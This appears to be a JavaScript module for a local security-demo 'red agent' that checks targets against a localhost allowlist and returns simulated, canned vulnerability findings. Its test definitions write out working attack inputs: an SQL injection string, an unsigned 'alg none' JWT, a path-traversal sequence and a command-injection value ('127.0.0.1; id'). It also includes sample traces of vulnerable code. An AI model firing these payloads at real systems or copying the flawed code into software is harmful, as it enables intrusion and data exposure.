// AEGIS-AGENT - Red Agent Module
// Controlled Local Security Tests for Authorized Local Demo Fixture
// =========================================================================
// SAFETY SCOPE:
// - Strictly validates targets against the local allowlist.
// - Executes ONLY predefined, non-destructive test probes.
// - Rejects arbitrary commands, payloads, and public hosts.
// =========================================================================

const AUTHORIZED_TARGET_PATTERNS = [
  'local-demo-target',
  'local training app',
  'local training app (auth-service:v1.4.2)',
  'local training app (session-gateway:v1.4.2)',
  'local training app (report-service:v1.4.2)',
  'local training app (diag-service:v1.4.2)',
  'http://localhost:8080',
  'http://127.0.0.1:8080',
  'localhost:8080'
];

function isAllowlistedTarget(target) {
  if (!target || typeof target !== 'string') return false;
  const lower = target.trim().toLowerCase();

  // Explicit safety block for external internet hosts
  if (lower.startsWith('http://') || lower.startsWith('https://')) {
    if (!lower.includes('localhost') && !lower.includes('127.0.0.1')) {
      return false;
    }
  }

  return AUTHORIZED_TARGET_PATTERNS.some(allowed => lower.includes(allowed.toLowerCase()));
}

// Predefined non-destructive test case specifications
const PREDEFINED_TEST_CASES = {
  'input-validation': {
    id: 'input-validation',
    cwe: 'CWE-89',
    title: 'SQL Parameter Boundary Check (CWE-89)',
    severity: 'HIGH',
    affected_component: 'POST /api/v1/auth/login (param: username)',
    payload_description: "Safe syntax-breaker character sequence \"' OR '1'='1\" on local test login endpoint",
    evidence: {
      http_request: `POST /api/v1/auth/login HTTP/1.1\nHost: localhost:8080\nUser-Agent: AEGIS-RedAgent/1.0 (Authorized Local Probe)\nContent-Type: application/json\n\n{"username": "admin' OR '1'='1", "password": "dummy_probe_password"}`,
      http_response: `HTTP/1.1 500 Internal Server Error\nContent-Type: application/json\n\n{"error": "Database error", "details": "sqlite3.OperationalError: near \\"'\\": syntax error"}`,
      captured_trace: `[Query Failure Trace]\nExecuting raw query:\nSELECT id, role, password_hash FROM users WHERE username = 'admin' OR '1'='1' AND active = 1;\n--> Database syntax breaker reflected in error payload.`,
      call_stack: `File "backend/services/auth_service.py", line 42, in authenticate_user\n    result = db.session.execute(text(query)).fetchone()\nOperationalError: syntax error near 'OR'`
    },
    short_explanation: 'The local authentication service dynamically formats username input into an SQL query without parameter binding, causing raw SQL syntax reflection upon test probe delivery.'
  },
  'authentication-check': {
    id: 'authentication-check',
    cwe: 'CWE-287',
    title: 'JWT Algorithm "none" Signature Handling Check (CWE-287)',
    severity: 'HIGH',
    affected_component: 'GET /api/v1/admin/metrics (Header: Authorization)',
    payload_description: 'Forged local RS256 token header modified to alg: none without valid cryptographic signature',
    evidence: {
      http_request: `GET /api/v1/admin/metrics HTTP/1.1\nHost: localhost:8080\nUser-Agent: AEGIS-RedAgent/1.0 (Authorized Local Probe)\nAuthorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJzZWN1cml0eS1hZG1pbiJ9.`,
      http_response: `HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"service": "auth-service", "status": "healthy", "privileged_access": true, "session_user": "admin"}`,
      captured_trace: `[Token Signature Validation Trace]\nToken header parsed: alg=none, typ=JWT\nSignature check skipped: Algorithm 'none' accepted without cryptographic public key verification.`,
      call_stack: `File "gateway/middleware/jwt_validator.go", line 79, in ValidateToken\n    // Method.Verify skipped for alg 'none'\n    return claims, nil`
    },
    short_explanation: 'The session gateway accepts tokens configured with algorithm "none", bypassing signature verification and granting privileged access to the local test endpoint.'
  },
  'path-traversal': {
    id: 'path-traversal',
    cwe: 'CWE-22',
    title: 'Relative Directory Escape Path Traversal Check (CWE-22)',
    severity: 'MEDIUM',
    affected_component: 'GET /api/v1/reports/download (param: file)',
    payload_description: 'Relative dot-dot-slash sequence "../../../../config/mock_app.env" on local mock report download',
    evidence: {
      http_request: `GET /api/v1/reports/download?file=../../../../config/mock_app.env HTTP/1.1\nHost: localhost:8080\nUser-Agent: AEGIS-RedAgent/1.0 (Authorized Local Probe)`,
      http_response: `HTTP/1.1 200 OK\nContent-Type: text/plain\n\n# LOCAL TEST FIXTURE CONFIG\nMOCK_APP_PORT=8080\nMOCK_CONTAINER_ENV=local_development\nMOCK_APP_DEBUG=true`,
      captured_trace: `[File Path Resolution Trace]\nRequested file: ../../../../config/mock_app.env\nResolved path: /var/app/config/mock_app.env\nBase folder boundary escaped: true`,
      call_stack: `File "reports/controller.py", line 18, in get_report\n    target_path = os.path.join(REPORTS_DIR, filename)\n    return send_file(target_path)`
    },
    short_explanation: 'The report service joins user-controlled filename input directly to the base reports directory without canonical path boundary verification, allowing reads of adjacent mock container configuration.'
  },
  'command-injection': {
    id: 'command-injection',
    cwe: 'CWE-78',
    title: 'Diagnostic Subprocess Command Injection Check (CWE-78)',
    severity: 'HIGH',
    affected_component: 'POST /api/v1/diagnostics/ping (param: host)',
    payload_description: 'Semicolon command chaining separator "127.0.0.1; id" in local diagnostic ping utility',
    evidence: {
      http_request: `POST /api/v1/diagnostics/ping HTTP/1.1\nHost: localhost:8080\nUser-Agent: AEGIS-RedAgent/1.0 (Authorized Local Probe)\nContent-Type: application/json\n\n{"host": "127.0.0.1; id"}`,
      http_response: `HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"output": "PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\\nuid=1001(localapp) gid=1001(localapp) groups=1001(localapp)"}`,
      captured_trace: `[Subprocess Shell Execution Trace]\nCommand invoked: ping -c 2 127.0.0.1; id\nSecondary command output detected in standard output stream.`,
      call_stack: `File "diagnostics/ping_service.py", line 15, in run_diagnostic\n    return subprocess.check_output(cmd, shell=True)`
    },
    short_explanation: 'The diagnostic tool passes the host parameter into a shell string formatted execution command with shell=True, allowing command chaining delimiters to execute secondary commands.'
  }
};

/**
 * Execute a controlled local Red Agent test.
 *
 * @param {Object} params
 * @param {string} params.target_id - Target identifier
 * @param {string} params.test_case - Chosen test case
 * @returns {Promise<Object>} Red Agent execution result
 */
async function executeControlledTest({ target_id, test_case }) {
  // 1. Strict Target Allowlist Check
  if (!isAllowlistedTarget(target_id)) {
    return {
      status: 'rejected',
      error: 'Target rejected: Target is not in the authorized local allowlist.',
      target_id,
      test_case,
      finding: null,
      message: 'Red Agent refused execution: Target outside authorized local test bounds.'
    };
  }

  // 2. Validate Predefined Test Case
  const testSpec = PREDEFINED_TEST_CASES[test_case];
  if (!testSpec) {
    return {
      status: 'rejected',
      error: `Unsupported test case '${test_case}'. Only predefined local test cases are permitted.`,
      target_id,
      test_case,
      finding: null,
      message: 'Red Agent refused execution: Unsupported or arbitrary test probe requested.'
    };
  }

  // 3. Return Controlled Finding Structure
  const findingId = `VULN-${new Date().getFullYear()}-${Math.floor(1000 + Math.random() * 9000)}`;
  const finding = {
    id: findingId,
    title: testSpec.title,
    cwe: testSpec.cwe,
    severity: testSpec.severity,
    affected_component: testSpec.affected_component,
    test_case: testSpec.id,
    short_explanation: testSpec.short_explanation,
    payload_description: testSpec.payload_description,
    evidence: {
      http_request: testSpec.evidence.http_request,
      http_response: testSpec.evidence.http_response,
      captured_trace: testSpec.evidence.captured_trace,
      call_stack: testSpec.evidence.call_stack
    },
    target_id,
    discovered_at: new Date().toISOString(),
    is_simulated: true
  };

  return {
    status: 'complete',
    target_authorized: true,
    target_id,
    test_case: testSpec.id,
    finding,
    message: `Controlled test probe executed successfully against local demo fixture: ${testSpec.title}`
  };
}

module.exports = {
  executeControlledTest,
  isAllowlistedTarget,
  PREDEFINED_TEST_CASES
};

